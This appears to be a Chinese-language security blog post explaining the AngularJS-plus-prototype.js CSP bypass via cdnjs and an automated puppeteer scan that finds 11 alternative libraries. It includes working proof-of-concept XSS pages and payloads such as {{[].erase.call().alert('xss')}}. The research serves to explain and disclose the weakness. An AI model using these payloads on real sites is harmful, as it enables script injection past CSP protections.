---
title: 自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品
catalog: true
date: 2022-09-01 19:31:10
tags: [Security]
categories: [Security]
---

<img src="/img/angularjs-csp-bypass-cdnjs/cover.png" style="display:none">

在我之前的文章：[從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦](https://blog.huli.tw/2021/08/22/cdnjs-and-supply-chain-attack/)裡面有提過可以藉由 cdnjs 來繞過 CSP，而有其中一種繞過手法必須搭配 prototype.js 才能成功。

在理解原理之後，我開始好奇在 cdnjs 上面是否還有其他 library 可以做到類似的事情，因此就開始著手研究。

這篇會從 cdnjs 的 CSP 繞過開始講，講到為什麼需要 prototype.js，接著再提到我怎麼從 cdnjs 上找到它的替代品。

<!-- more -->

## cdnjs + AngularJS CSP bypass

在 CSP 裡面放上 `https://cdnjs.cloudflare.com` 其實是很危險的一件事情，因為有一個許多人都知道的方式，可以繞過這個 CSP。

詳情可參考這兩篇文章：

1. [Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)
2. [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)

實際的繞過方式如下：

``` html
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSP bypass</title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src https://cdnjs.cloudflare.com">
  </head>
  <body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{$on.curry.call().alert('xss')}}
    </div>
  </body>
</html>
```

因為 CSP 中有 cdnjs，所以我們可以引入其他的 library，這邊我們挑的是 AngularJS，引入了以後我們就可以用 CSTI 的方式注入底下這一段：

``` html
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>
```

這邊為什麼是 `$on.curry.call()` 呢？你可以把它換成 `window` 看看，會發現沒有反應，這是因為 AngularJS 的 expression 是放在一個 scope object 裡面，你沒辦法直接存取到 window 或是 window 上的屬性。

而這邊有另一個重點是 CSP 沒有開 `unsafe-eval`，所以你也不能直接 `constructor.constructor('alert(1)')()` 之類的。

從最後的結果看起來，`$on.curry.call()` 似乎等同於 window，那是為什麼呢？這就是 prototype.js 派上用場的地方了，我們來看一下它的部分原始碼，[src/prototype/lang/function.js](https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226)：

``` js
function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
```

這個 function 會加在 `Function.prototype` 上面，而重點其實只有第一行：` if (!arguments.length) return this;`，如果沒有帶參數的話，會直接回傳 `this`。在 JavaScript 裡面，如果你用 `call` 或是 `apply` 來呼叫函式的話，第一個參數可以指定 `this` 的值，如果沒有傳的話就會是預設值，在嚴格模式底下是 `undefined`，非嚴格模式底下是 `window`。

這也是為什麼 `$on.curry.call()` 會是 `window`，因為 `$on` 是個 function，所以呼叫 `$on.curry.call()` 的時候，由於 `this` 沒帶所以預設是 `window`，參數也沒帶，因此 `curry` 這個函式就會根據第一行的條件句，把 `this` 也就是 `window` 回傳回來。

總結一下，之所以 AngularJS 需要 prototype.js 的幫忙，是因為 prototype.js：

1. 提供了一個加在 prototype 上的函式
2. 而且這個函式會回傳 this

第一點很重要，因為前面有提過在 expression 裡面沒辦法存取到 window，所以一般的 library 加的東西其實也是拿不到的，但 prototype.js 是把東西放在 prototype 上面，所以可以透過 prototype 來存取到新增的 method。

第二點也很重要，搭配 this 預設會是 window 這個特性，就可以讓我們拿到 window。

知道了原理之後，就知道該怎麼找替代品了，只要找到有相同功能的就好了。而此時我突然想到以前寫過的一篇文章：[Don’t break the Web：以 SmooshGate 以及 keygen 為例](https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/)，在裡面我有提到因為 MooTools 習慣在 prototype 上面新增東西，導致原本要叫做 flatten 的 method 只好改名叫 flat（後來看 [maple 的 writeup](https://blog.maple3142.net/2022/08/29/intigriti-0822-xss-challenge-writeup/) 才知道原來 `Array.prototype.includes` 不叫 `Array.prototype.contains` 也是因為 MooTools）

那會不會 MooTools 也符合我們上面的條件呢？

## 手動找出替代品之 MooTools

我們可以在這個資料夾中找出 MooTools 改的各種 prototype：https://github.com/mootools/mootools-core/tree/master/Source/Types

裡面有：

1. Array
2. DOMEvent
3. Function
4. Number
5. Object
6. String

因為檔案都不大，所以可以一個一個看，想更快的話也可以直接用 `return this` 當作關鍵字來搜尋，結果隨便一找就找到兩個：

``` js
Array.implement({
  erase: function(item){
    for (var i = this.length; i--;){
      if (this[i] === item) this.splice(i, 1);
    }
    return this;
  },

  empty: function(){
    this.length = 0;
    return this;
  },
})
```

`Array.prototype.erase` 跟 `Array.prototype.empty` 兩個函式都會回傳 `this`，所以底下兩個方法都可以拿到 window：

1. [].erase.call()
2. [].empty.call()

接著馬上來試試看 CSP bypass 是否成功：

``` html
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSP bypass - MooTools</title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src https://cdnjs.cloudflare.com">
  </head>
  <body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{[].erase.call().alert('xss')}}
    </div>
  </body>
</html>
```

打開網頁之後發現確實有跳出 alert，果然成功了！

既然確認手動找得到以後，就可以來想想看怎麼自動化了。

## 自動化尋找替代品

一個滿簡單直覺的自動化流程大概就是：

1. 找出 cdnjs 上面所有的 library
2. 找出每個 library 的所有 JS 檔案
3. 用 headless browser（我用 puppeteer）來測試每個 JS 是否會在 prototype 上新增屬性
4. 嘗試呼叫新增的屬性，看是否會回傳 window

其中有一些細節的部分端看個人想要怎麼處理，例如說更精緻一點的話可以針對套件的所有版本都做測試，但是那樣做的話測試量可能會變五到十倍，由於我只是想做個初步的研究，所以不考慮套件版本，一律使用最新版的。

此外，除了找到可以回傳 this 的方法以外，我也想看有哪些套件會去動你的 prototype，這個可以從第三步的結果得知。

最後，我這邊只找「沒帶參數呼叫以後會回傳 `this` 的方法」，但可能會有那種參數符合特定條件才回會傳 `this` 的，這些需要人工去看，所以我先不考慮。

### 找出 cdnjs 上所有的 library

去 cdnjs 的網站上面觀察一下，可以發現背後是去呼叫放在 algolia 的 API，algolia 其實有提供把所有資料拉回來的方法，但官網的 api key 不支援，然後分頁的話又會受到限制，只能拿到前 1000 筆結果。

於是，我找到了 search 的 API，先假設每個字母開頭的套件不會超過 1000 個，就可以從 a-zA-Z0-9 去尋找以每個字母開頭的套件，藉此繞過 1000 筆的限制，讀到所有套件的資料。

程式碼的實作大概是這樣：

``` js
const axios = require('axios')
const fs = require('fs');

const API_HOST = 'https://2qwlvlxzb6-dsn.algolia.net/'
const SEARCH_API_URL = '/1/indexes/libraries/query'
const API_KEY = '2663c73014d2e4d6d1778cc8ad9fd010'
const APP_ID = '2QWLVLXZB6'

const instance = axios.create({
  baseURL: API_HOST,
  headers: {
    'x-algolia-api-key': API_KEY,
    'x-algolia-application-id': APP_ID
  }
})

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

function write(content) {
  fs.writeFileSync('./data/libs.json', content)
}

async function main() {
  let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('')
  let allItems = []
  let existLib = {}
  for(let char of chars) {
    console.log(`fetching ${char}`)
    try {
      await sleep(500)
      const data = await getLibraries(char)
      const hits = data.hits
      console.log('length:', hits.length)

      const filtered = []
      for(let item of hits) {
        if (!existLib[item.name]) {
          filtered.push(item)
        }
        existLib[item.name] = true
      }
      allItems = allItems.concat(filtered)
      console.log('filtered length:', filtered.length)
      console.log('total length:', allItems.length)
      write(JSON.stringify(allItems, null, 2))
    } catch(err) {
      console.log('Error!')
      console.log(err, err.toString())
    }
  }
}

async function getLibraries(keyword) {
  const response = await instance.post(SEARCH_API_URL, {
        params: `query=${keyword}&page=0&hitsPerPage=1000`,
        restrictSearchableAttributes: [
          'name'
        ]
  })
  return response.data
}

main()

```

跑完以後，我們就可以拿到一個有所有 cdnjs 套件跟名稱的列表。

### 找出每個 library 的所有 JS 檔案

套件的基本資料是放在 algolia，但是一些細節則是放在 cdnjs 自己的 API。

而這個 API 的規則也很簡單，網址就是：`https://api.cdnjs.com/libraries/${套件名稱}/${版本}`，所以只要把上一步的列表整理一下拿去打 API，就可以拿到每一個套件有哪些檔案：

``` js
const axios = require('axios')
const fs = require('fs');

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

function write(content) {
  fs.writeFileSync('./data/libDetail.json', content)
}

if (!fs.existsSync('./data/libDetail.json')) {
  write('[]')
}

const existMap = {}
let detailItems = JSON.parse(fs.readFileSync('./data/libDetail.json', 'utf8'))
for(let item of detailItems) {  
  existMap[item.name] = true
}

async function getDetail(libName, version) {
  const url = `https://api.cdnjs.com/libraries/${encodeURIComponent(libName)}/${version}`
  try {
    const response = await axios(url)
    return response.data
  } catch(err) {
    console.log(url)
    console.log('failed:', libName, err.message)
    //process.exit(1)
  }
}

async function getLib(libraries, lib) {
  console.log('fetching:', lib.name)
  const detail = await getDetail(lib.name, lib.version)
  if (!detail) return
  detailItems.push(detail)
  write(JSON.stringify(detailItems, null, 2))
  console.log(`progress: ${detailItems.length}/${libraries.length}`)
}

async function getFiles() {
  const libraries = JSON.parse(fs.readFileSync('./data/libs.json', 'utf8'))
  for(let lib of libraries) {
    if (existMap[lib.name]) continue
    await sleep(200)
    getLib(libraries, lib)
  }
}

async function main() {
  getFiles()
}

main()
```

### 找出符合條件的套件

套件列表有了，每個套件有哪些檔案也有了。接著來到我們的最後一步：找出符合條件的套件。

在 cdnjs 上的套件有 4000 多個，如果一個一個跑的話，那就必須跑 4000 多遍，但其實符合我們條件的應該是少數，所以我選擇 10 個一組去跑，原因是 10 個套件的檔案應該不至於到真的太多，不用怕載入時間很長。如果這 10 個套件都沒有更動 prototype，那就下一組，如果有的話，就用類似二分搜的方式去找出哪些套件有改動到。

而偵測的 HTML 大概長這樣：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <script>
    function getPrototypeFunctions(prototype) {
      return Object.getOwnPropertyNames(prototype)
    }
    var protos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
  </script>
</head>
<body>
  <!-- insert script here -->
  <script src="..."></script>
  <!-- insert script here -->
  <script>
    var newProtos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
    let result = {
      prototypeFunctions: [],
      functionsReturnWindow: []
    }
    function check() {
      checkPrototype('array', 'Array.prototype', Array.prototype)
      checkPrototype('string', 'String.prototype', String.prototype)
      checkPrototype('number', 'Number.prototype', Number.prototype)
      checkPrototype('object', 'Object.prototype', Object.prototype)
      checkPrototype('function', 'Function.prototype', Function.prototype)
      return result
    }
    function checkPrototype(name, prototypeName, prototype) {
      const oldFuncs = protos[name]
      const newFuncs = newProtos[name]
      for(let fnName of newFuncs) {
        if (!oldFuncs.includes(fnName)) {
          const fullName = prototypeName + '.' + fnName
          result.prototypeFunctions.push(fullName)
          try {
            if (prototype[fnName].call() === window) {
              result.functionsReturnWindow.push(fullName)
            }
          } catch(err) {
          }
        }
      }
    }
  </script>
</body>
</html>
```

我們在套件還沒載入時，先記錄起每個 prototype 上面的屬性，載入套件以後再記錄一次然後跟之前做比對，就可以找出哪些是套件引入後才新增的屬性。然後我們也可以把結果分成兩種，一種是只要有改動到 prototype 就記下來，另外一種則是呼叫以後會回傳 window 的。

整個測試的程式碼比較長一點，完整版在這邊：https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js

但流程大概就是：

1. 每十個套件一組，找出會汙染 prototype 的套件
2. 找出套件後，再找出到底是哪些檔案會汙染 prototype
3. 印出結果

## 研究結果

在 4290 個套件中，有 74 個（1.72%）套件會在 prototype 上面新增屬性，清單如下：

1. `6to5@3.6.5`
2. `Colors.js@1.2.4`
3. `Embetty@3.0.8`
4. `NicEdit@0.93`
5. `RGraph@606`
6. `ScrollTrigger@1.0.5`
7. `TableExport@5.2.0`
8. `ajv-async@1.0.1`
9. `angular-vertxbus@6.4.1`
10. `asciidoctor.js@1.5.9`
11. `aurelia-script@1.5.2`
12. `blendui@0.0.4`
13. `blissfuljs@1.0.6`
14. `bootstrap-calendar@0.2.5`
15. `carto.js@4.2.2`
16. `cignium-hypermedia-client@1.35.0`
17. `core-js@3.24.1`
18. `custombox@4.0.3`
19. `d3fc@11.0.0`
20. `d3plus@2.0.1`
21. `datejs@1.0`
22. `deb.js@0.0.2`
23. `defiant.js@2.2.7`
24. `eddy@0.7.0`
25. `ext-core@3.1.0`
26. `extjs@6.2.0`
27. `fs-tpp-api@2.4.4`
28. `highcharts@10.2.0`
29. `inheritance-js@0.4.12`
30. `jo@0.4.1`
31. `jquery-ajaxy@1.6.1`
32. `jquery-ui-bootstrap@0.5pre`
33. `js-bson@2.0.8`
34. `jslite@1.1.12`
35. `json-forms@1.6.3`
36. `keras-js@0.3.0`
37. `kwargsjs@1.0.1`
38. `leaflet.freedraw@2.0.1`
39. `lobipanel@1.0.6`
40. `melonjs@1.0.1`
41. `metro@4.4.3`
42. `mo@1.7.3`
43. `monet@0.9.3`
44. `mootools@1.6.0`
45. `oidc-client@1.11.5`
46. `opal@0.3.43`
47. `prototype@1.7.3`
48. `qcobjects@2.3.69`
49. `qoopido.demand@8.0.2`
50. `qoopido.js@3.7.4`
51. `qoopido.nucleus@3.2.15`
52. `quantumui@1.2.0`
53. `rantjs@1.0.6`
54. `rita@2.8.1`
55. `rivescript@2.2.0`
56. `scriptaculous@1.9.0`
57. `should.js@13.2.3`
58. `simple-gallery-js@1.0.3`
59. `simplecartjs@3.0.5`
60. `strapdown-topbar@1.6.4`
61. `string_score@0.1.22`
62. `survey-angular@1.9.45`
63. `survey-jquery@1.9.45`
64. `survey-knockout@1.9.45`
65. `survey-react@1.9.45`
66. `survey-vue@1.9.45`
67. `tablefilter@2.5.0`
68. `tmlib.js@0.5.2`
69. `tui-editor@1.4.10`
70. `typeis@1.1.2`
71. `uppy@3.0.0`
72. `vanta@0.5.22`
73. `waud.js@1.0.3`
74. `zui@1.10.0`

而這 74 個中，有 12 個（16.2%）符合我們的條件，直接呼叫會回傳 `this`，清單如下：

``` json
[
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js",
    "functions": [
      "Array.prototype.$concat",
      "Array.prototype.$push",
      "Array.prototype.$append",
      "Array.prototype.$rotate!",
      "Array.prototype.$shuffle!",
      "Array.prototype.$sort",
      "Array.prototype.$to_a",
      "Array.prototype.$to_ary",
      "Array.prototype.$unshift",
      "Array.prototype.$prepend",
      "String.prototype.$initialize",
      "String.prototype.$chomp",
      "String.prototype.$force_encoding",
      "Function.prototype.$to_proc"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js",
    "functions": [
      "Number.prototype.milliseconds",
      "Number.prototype.millisecond",
      "Number.prototype.seconds",
      "Number.prototype.second",
      "Number.prototype.minutes",
      "Number.prototype.minute",
      "Number.prototype.hours",
      "Number.prototype.hour",
      "Number.prototype.days",
      "Number.prototype.day",
      "Number.prototype.weeks",
      "Number.prototype.week",
      "Number.prototype.months",
      "Number.prototype.month",
      "Number.prototype.years",
      "Number.prototype.year"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js",
    "functions": [
      "Function.prototype.createInterceptor"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js",
    "functions": [
      "Number.prototype.milliseconds",
      "Number.prototype.millisecond",
      "Number.prototype.seconds",
      "Number.prototype.second",
      "Number.prototype.minutes",
      "Number.prototype.minute",
      "Number.prototype.hours",
      "Number.prototype.hour",
      "Number.prototype.days",
      "Number.prototype.day",
      "Number.prototype.weeks",
      "Number.prototype.week",
      "Number.prototype.months",
      "Number.prototype.month",
      "Number.prototype.years",
      "Number.prototype.year"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js",
    "functions": [
      "String.prototype.format"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js",
    "functions": [
      "Object.prototype.mix",
      "Object.prototype.mixDeep"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js",
    "functions": [
      "Array.prototype.remove"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js",
    "functions": [
      "Array.prototype.erase",
      "Array.prototype.empty",
      "Function.prototype.extend",
      "Function.prototype.implement",
      "Function.prototype.hide",
      "Function.prototype.protect"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js",
    "functions": [
      "Array.prototype.erase",
      "Array.prototype.empty",
      "Function.prototype.extend",
      "Function.prototype.implement",
      "Function.prototype.hide",
      "Function.prototype.protect"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js",
    "functions": [
      "Array.prototype.$extend",
      "Array.prototype.$to_proc",
      "Array.prototype.$to_a",
      "Array.prototype.$collect!",
      "Array.prototype.$delete_if",
      "Array.prototype.$each_index",
      "Array.prototype.$fill",
      "Array.prototype.$insert",
      "Array.prototype.$keep_if",
      "Array.prototype.$map!",
      "Array.prototype.$push",
      "Array.prototype.$shuffle",
      "Array.prototype.$to_ary",
      "Array.prototype.$unshift",
      "String.prototype.$as_json",
      "String.prototype.$extend",
      "String.prototype.$intern",
      "String.prototype.$to_sym",
      "Number.prototype.$as_json",
      "Number.prototype.$extend",
      "Number.prototype.$to_proc",
      "Number.prototype.$downto",
      "Number.prototype.$nonzero?",
      "Number.prototype.$ord",
      "Number.prototype.$times",
      "Function.prototype.$include",
      "Function.prototype.$module_function",
      "Function.prototype.$extend",
      "Function.prototype.$to_proc"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js",
    "functions": [
      "Array.prototype.clear",
      "Number.prototype.times",
      "Function.prototype.curry"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js",
    "functions": [
      "Array.prototype.swap",
      "Array.prototype.eraseAll",
      "Array.prototype.eraseIf",
      "Array.prototype.eraseIfAll",
      "Array.prototype.clear",
      "Array.prototype.shuffle",
      "Number.prototype.times",
      "Number.prototype.upto",
      "Number.prototype.downto",
      "Number.prototype.step",
      "Object.prototype.$extend",
      "Object.prototype.$safe",
      "Object.prototype.$strict"
    ]
  }
]
```

扣掉開頭講的 prototype.js，我們還有其他 11 個套件可以搭配使用，讓我們繞過限制，順利拿到 `window`。

## 總結

透過把 cdnjs 上的套件資料都抓下來，以及使用 headless browser 幫忙驗證，我們成功找到了 11 個 prototype.js 的替代品，這些套件都會在 prototype 上面新增方法，而且呼叫這些方法以後都會回傳 `this`，可以藉由呼叫它來取得 `window`。

從開始執行到產出結果，大概花了一兩天而已，因為資料格式相對單純，驗證方式也很單純，數量也沒有說真的很多，想加速的話也可以多開幾個 thread 來跑。

另外，找出替代品其實也沒什麼太大的意義，只是好奇而已，因為通常也不會有網頁特別去擋 `prototype.js`，所以其實只要找到一個可以拿到 `window` 的套件就足夠了。

但總之這個研究的過程還是滿好玩的。

完整程式碼：https://github.com/aszx87410/cdnjs-prototype-pollution
